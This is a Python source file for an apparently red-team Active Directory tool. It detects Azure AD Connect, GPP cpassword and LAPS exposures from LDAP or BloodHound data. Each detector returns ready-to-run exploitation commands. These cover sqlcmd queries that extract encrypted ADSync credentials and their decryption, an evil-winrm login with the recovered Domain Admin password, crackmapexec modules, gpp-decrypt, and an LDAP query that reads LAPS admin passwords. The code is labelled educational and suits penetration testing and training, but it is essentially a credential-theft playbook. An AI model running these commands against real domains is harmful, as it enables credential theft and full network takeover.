"""
Attack Vector Detection Framework

Detects specific attack opportunities from enumeration data and suggests
exploitation steps with educational context.

Supports detection from:
- LDAP enumeration data
- BloodHound/Neo4j data
- Local system enumeration

Each detector provides:
- Detection logic (what to look for)
- Confidence scoring
- Exploitation commands
- Educational explanations

Example:
    detector = AzureADConnectDetector()
    result = detector.detect_from_ldap(users_data)

    if result:
        print(f"Detected: {result.indicator}")
        for cmd in result.attack_commands:
            print(f"  {cmd}")
"""

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional


class DetectionConfidence(Enum):
    """Confidence level in detection."""
    CONFIRMED = "confirmed"  # Strong evidence, high confidence
    LIKELY = "likely"        # Good evidence, needs verification
    POSSIBLE = "possible"    # Weak evidence, investigate further


@dataclass
class AttackCommand:
    """
    Single attack command with context.

    Provides the command AND explains why it works,
    supporting both automation and learning.
    """
    command: str
    description: str
    explanation: str          # WHY this works (educational)
    prerequisites: List[str] = field(default_factory=list)  # What you need first
    alternatives: List[str] = field(default_factory=list)   # Other ways to do this
    references: List[str] = field(default_factory=list)     # URLs for learning


@dataclass
class DetectionResult:
    """
    Result from attack vector detection.

    Contains evidence, exploitation commands, and educational context.
    """
    indicator: str                    # "azure_ad_connect", "gpp", "laps", etc.
    name: str                         # Human-readable name
    confidence: DetectionConfidence
    evidence: List[str] = field(default_factory=list)  # What triggered detection
    attack_commands: List[AttackCommand] = field(default_factory=list)
    next_steps: List[str] = field(default_factory=list)  # What to do next
    references: List[str] = field(default_factory=list)  # URLs for research

    def __bool__(self) -> bool:
        """Result is truthy if detection was positive."""
        return len(self.evidence) > 0


class DetectorBase(ABC):
    """
    Abstract base for attack vector detectors.

    Each detector looks for specific attack opportunities and provides
    exploitation guidance with educational context.
    """

    @property
    @abstractmethod
    def indicator_name(self) -> str:
        """Unique identifier for this attack vector."""
        pass

    @property
    @abstractmethod
    def display_name(self) -> str:
        """Human-readable name."""
        pass

    @property
    @abstractmethod
    def description(self) -> str:
        """Brief description of what this detects."""
        pass

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """
        Detect from LDAP enumeration data.

        Override in subclasses that support LDAP detection.

        Args:
            users: List of user dicts with name, upn, description, etc.
            groups: List of group dicts with name, members
            computers: List of computer dicts
            context: Additional context (target_ip, domain, etc.)

        Returns:
            DetectionResult if detected, None otherwise
        """
        return None

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """
        Detect from BloodHound/Neo4j data.

        Override in subclasses that support BloodHound detection.

        Args:
            neo4j_session: Active Neo4j session
            context: Additional context

        Returns:
            DetectionResult if detected, None otherwise
        """
        return None

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        """
        Get exploitation commands for this attack vector.

        Override to provide attack-specific commands.

        Args:
            context: Target info (ip, domain, credentials, etc.)

        Returns:
            List of AttackCommand objects
        """
        return []


class AzureADConnectDetector(DetectorBase):
    """
    Detect Azure AD Connect installation.

    Azure AD Connect syncs on-prem AD to Azure AD. The sync account
    credentials are stored in a SQL database and can be extracted
    by members of ADSyncAdmins or local admins on the AAD Connect server.

    Detection indicators:
    - Accounts starting with AAD_ or MSOL_
    - ADSyncAdmins, Azure Admins groups
    - Microsoft Azure AD Sync in installed programs
    """

    # Account patterns indicating Azure AD Connect
    SYNC_ACCOUNT_PATTERNS = ['AAD_', 'MSOL_']

    # Groups that indicate Azure AD presence
    AZURE_GROUPS = [
        'ADSyncAdmins',
        'ADSyncOperators',
        'ADSyncBrowse',
        'ADSyncPasswordSet',
        'Azure Admins',
    ]

    @property
    def indicator_name(self) -> str:
        return "azure_ad_connect"

    @property
    def display_name(self) -> str:
        return "Azure AD Connect"

    @property
    def description(self) -> str:
        return "Azure AD Connect syncs on-prem AD to Azure. Credentials can be extracted."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect Azure AD Connect from LDAP user/group data."""
        evidence = []

        # Check for sync accounts (AAD_, MSOL_)
        for user in users:
            name = (user.get('name') or '').upper()
            upn = (user.get('upn') or '').upper()

            for pattern in self.SYNC_ACCOUNT_PATTERNS:
                if name.startswith(pattern) or upn.startswith(pattern):
                    evidence.append(f"Sync account found: {user.get('name', name)}")
                    break

        # Check for Azure-related groups
        for group in groups:
            group_name = group.get('name') or ''
            for azure_group in self.AZURE_GROUPS:
                if azure_group.lower() in group_name.lower():
                    evidence.append(f"Azure group found: {group_name}")
                    members = group.get('members', [])
                    if members:
                        evidence.append(f"  Members: {', '.join(members[:5])}")

        if not evidence:
            return None

        # Determine confidence
        has_sync_account = any('Sync account' in e for e in evidence)
        has_azure_group = any('Azure group' in e for e in evidence)

        if has_sync_account and has_azure_group:
            confidence = DetectionConfidence.CONFIRMED
        elif has_sync_account:
            confidence = DetectionConfidence.LIKELY
        else:
            confidence = DetectionConfidence.POSSIBLE

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=confidence,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Identify the server running Azure AD Connect",
                "Check if current user is member of ADSyncAdmins or local admin",
                "Extract credentials using ADSync decryption",
            ],
            references=[
                "https://blog.xpnsec.com/azuread-connect-for-redteam/",
                "https://github.com/fox-it/adconnectdump",
                "https://www.dsinternals.com/en/dumping-azure-ad-connect-credentials/",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect Azure AD Connect from BloodHound data."""
        evidence = []

        # Query for AAD/MSOL accounts
        query_sync = """
        MATCH (u:User)
        WHERE u.name STARTS WITH 'AAD_' OR u.name STARTS WITH 'MSOL_'
        RETURN u.name AS name, u.description AS description
        LIMIT 10
        """

        try:
            result = neo4j_session.run(query_sync)
            for record in result:
                name = record.get('name') or ''
                desc = record.get('description') or ''
                evidence.append(f"Sync account: {name}")
                if desc:
                    evidence.append(f"  Description: {desc}")
        except Exception:
            pass

        # Query for Azure-related groups
        query_groups = """
        MATCH (g:Group)
        WHERE g.name CONTAINS 'AZURE' OR g.name CONTAINS 'ADSYNC'
        OPTIONAL MATCH (u:User)-[:MemberOf*1..]->(g)
        RETURN g.name AS group_name, collect(DISTINCT u.name)[..5] AS members
        """

        try:
            result = neo4j_session.run(query_groups)
            for record in result:
                group_name = record.get('group_name') or ''
                members = record.get('members') or []
                evidence.append(f"Azure group: {group_name}")
                if members:
                    # Filter out None values from members list
                    valid_members = [m for m in members if m]
                    if valid_members:
                        evidence.append(f"  Members: {', '.join(valid_members)}")
        except Exception:
            pass

        if not evidence:
            return None

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.LIKELY,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Check if pwned user is member of ADSyncAdmins",
                "Identify Azure AD Connect server",
                "Run credential extraction",
            ],
            references=[
                "https://blog.xpnsec.com/azuread-connect-for-redteam/",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        """Get Azure AD Connect exploitation commands."""
        target = context.get('target_ip', '<DC_IP>')
        domain = context.get('domain', '<DOMAIN>')
        dc_hostname = context.get('dc_hostname', 'YOURDC')

        commands = [
            AttackCommand(
                command=f"# Step 1: Check if ADSync database is accessible",
                description="Query ADSync configuration",
                explanation="Azure AD Connect stores sync credentials in a SQL database (ADSync). "
                           "Local Admins or ADSyncAdmins can query this database.",
                prerequisites=["Local admin or ADSyncAdmins membership on AAD Connect server"],
            ),
            AttackCommand(
                command=f'sqlcmd -S {dc_hostname} -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"',
                description="Extract encryption parameters from ADSync",
                explanation="The encryption keys (entropy, instance_id, keyset_id) are needed "
                           "to decrypt the stored credentials using DPAPI.",
                prerequisites=["Access to the ADSync SQL database"],
                alternatives=[
                    f'sqlcmd -S localhost\\ADSync -Q "..."  # LocalDB instance',
                ],
            ),
            AttackCommand(
                command=f'sqlcmd -S {dc_hostname} -Q "use ADsync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \'AD\'"',
                description="Extract encrypted credentials",
                explanation="The encrypted_configuration contains the sync account password, "
                           "encrypted with DPAPI using the keys from mms_server_configuration.",
            ),
            AttackCommand(
                command="# Step 2: Decrypt credentials using xpn's script or AdDecrypt.exe",
                description="Decrypt the extracted credentials",
                explanation="Microsoft's published DPAPI mechanism allows decryption with the "
                           "entropy and keyset values. Tools like ADConnect.ps1 automate this.",
                references=[
                    "https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545",
                    "https://github.com/fox-it/adconnectdump",
                ],
                alternatives=[
                    "python3 adconnectdump.py -dc-ip {target} {domain}/user:pass",
                    "AdDecrypt.exe -FullSQL",
                ],
            ),
            AttackCommand(
                command=f"evil-winrm -i {target} -u administrator -p '<DECRYPTED_PASSWORD>'",
                description="Connect with extracted Domain Admin credentials",
                explanation="The sync account is often the default Domain Administrator, "
                           "granting full domain control upon credential extraction.",
            ),
        ]

        return commands


class GPPPasswordDetector(DetectorBase):
    """
    Detect Group Policy Preferences (GPP) with cpassword.

    GPP passwords (MS14-025) are encrypted with a publicly known AES key.
    Found in SYSVOL under Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
    """

    @property
    def indicator_name(self) -> str:
        return "gpp_password"

    @property
    def display_name(self) -> str:
        return "GPP cpassword (MS14-025)"

    @property
    def description(self) -> str:
        return "Group Policy Preferences store passwords encrypted with a public key."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """GPP detection requires SYSVOL access, not LDAP."""
        # This would be detected by SMB crawler finding Groups.xml
        # Return suggestion to check SYSVOL
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.POSSIBLE,
            evidence=["SYSVOL share should be checked for GPP files"],
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Access SYSVOL share",
                "Search for Groups.xml, Services.xml, ScheduledTasks.xml",
                "Decrypt cpassword values",
            ],
            references=[
                "https://adsecurity.org/?p=2288",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<DC_IP>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')

        return [
            AttackCommand(
                command=f"crackmapexec smb {target} -u '{user}' -p '{password}' -M gpp_password",
                description="Auto-find and decrypt GPP passwords",
                explanation="CrackMapExec's gpp_password module searches SYSVOL for "
                           "cpassword values and decrypts them automatically.",
            ),
            AttackCommand(
                command=f"findstr /S /I cpassword \\\\{target}\\sysvol\\*.xml",
                description="Manual search for cpassword in SYSVOL",
                explanation="Search all XML files in SYSVOL for the cpassword attribute.",
            ),
            AttackCommand(
                command="gpp-decrypt <CPASSWORD>",
                description="Decrypt cpassword value",
                explanation="Microsoft published the AES key used for GPP encryption, "
                           "making decryption trivial with tools like gpp-decrypt.",
            ),
        ]


class LAPSDetector(DetectorBase):
    """
    Detect LAPS (Local Administrator Password Solution) deployment.

    LAPS stores unique local admin passwords in AD. Users with read access
    to ms-Mcs-AdmPwd attribute can retrieve these passwords.
    """

    @property
    def indicator_name(self) -> str:
        return "laps"

    @property
    def display_name(self) -> str:
        return "LAPS (Local Admin Passwords)"

    @property
    def description(self) -> str:
        return "LAPS stores local admin passwords in AD - check read permissions."

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect LAPS from BloodHound data."""
        evidence = []

        # Check for computers with LAPS
        query = """
        MATCH (c:Computer)
        WHERE c.haslaps = true
        RETURN c.name AS computer
        LIMIT 20
        """

        try:
            result = neo4j_session.run(query)
            computers = [r['computer'] for r in result]
            if computers:
                evidence.append(f"LAPS enabled on {len(computers)} computers")
                evidence.append(f"Examples: {', '.join(computers[:5])}")
        except Exception:
            pass

        if not evidence:
            return None

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Check who can read ms-Mcs-AdmPwd attribute",
                "Target computers where pwned user has LAPS read access",
            ],
            references=[
                "https://www.yourteacher.io/laps-password-dumping/",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<DC_IP>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')
        domain = context.get('domain', '<DOMAIN>')

        return [
            AttackCommand(
                command=f"crackmapexec ldap {target} -u '{user}' -p '{password}' -M laps",
                description="Dump LAPS passwords for readable computers",
                explanation="If your user has GenericAll or ReadLAPSPassword on a computer, "
                           "you can retrieve its local admin password from AD.",
            ),
            AttackCommand(
                command=f"ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b 'DC=<DOMAIN>,DC=LOCAL' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd",
                description="Manual LDAP query for LAPS passwords",
                explanation="Query the ms-Mcs-AdmPwd attribute directly via LDAP. "
                           "Replace DC=<DOMAIN>,DC=LOCAL with your actual domain base DN.",
            ),
        ]


class DetectorRegistry:
    """
    Registry of attack vector detectors.

    Runs all registered detectors and aggregates results.
    """

    def __init__(self):
        self._detectors: List[DetectorBase] = []

    def register(self, detector: DetectorBase) -> "DetectorRegistry":
        """Register a detector (chainable)."""
        self._detectors.append(detector)
        return self

    def detect_all_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> List[DetectionResult]:
        """Run all detectors against LDAP data."""
        results = []
        for detector in self._detectors:
            result = detector.detect_from_ldap(users, groups, computers, context)
            if result:
                results.append(result)
        return results

    def detect_all_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> List[DetectionResult]:
        """Run all detectors against BloodHound data."""
        results = []
        for detector in self._detectors:
            result = detector.detect_from_bloodhound(neo4j_session, context)
            if result:
                results.append(result)
        return results

    def list_detectors(self) -> List[Dict[str, str]]:
        """List all registered detectors."""
        return [
            {
                "indicator": d.indicator_name,
                "name": d.display_name,
                "description": d.description,
            }
            for d in self._detectors
        ]


def get_default_registry() -> DetectorRegistry:
    """Get registry with all default detectors."""
    registry = DetectorRegistry()
    registry.register(AzureADConnectDetector())
    registry.register(GPPPasswordDetector())
    registry.register(LAPSDetector())
    return registry
